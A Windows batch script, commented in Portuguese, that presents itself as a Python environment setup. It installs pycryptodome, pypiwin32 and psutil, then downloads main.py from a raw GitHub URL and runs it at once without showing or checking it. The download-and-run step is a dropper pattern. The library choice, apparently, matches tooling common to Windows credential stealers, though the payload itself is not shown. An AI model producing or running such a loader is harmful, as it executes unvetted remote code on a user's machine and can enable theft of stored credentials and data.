@echo off
:: Altera a codificação do terminal para exibir acentos corretamente
chcp 65001 > nul
cls

echo ====================================================
echo   CONFIGURANDO E EXECUTANDO AMBIENTE PYTHON
echo ====================================================
echo.

:: 1. Criando o ambiente virtual
echo [1/5] Criando ambiente virtual (venv)...
python -m venv venv
if %errorlevel% neq 0 (
    echo Erro ao criar o ambiente virtual. Verifique se o Python está instalado no seu PATH.
    pause
    exit /b
)

:: 2. Ativando o ambiente e atualizando o pip
echo [2/5] Ativando venv e atualizando o pip...
call venv\Scripts\activate
python -m pip install --upgrade pip

:: 3. Instalando a biblioteca necessária
echo [3/5] Instalando a biblioteca pycryptodome...
python -m pip install pycryptodome pypiwin32 psutil
if %errorlevel% neq 0 (
    echo Erro ao instalar as dependências.
    pause
    exit /b
)

:: 4. Baixando o script do GitHub
echo [4/5] Baixando o arquivo main.py do GitHub...
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/richardzinho2019-cell/teste/refs/heads/main/main.py' -OutFile 'main.py'"

:: 5. Executando o script
echo [5/5] Executando o script main.py...
echo ----------------------------------------------------
echo.
python main.py
echo.
echo ----------------------------------------------------

:: Mantém a janela aberta após a execução do script finalizar
echo Processo concluído.
pause
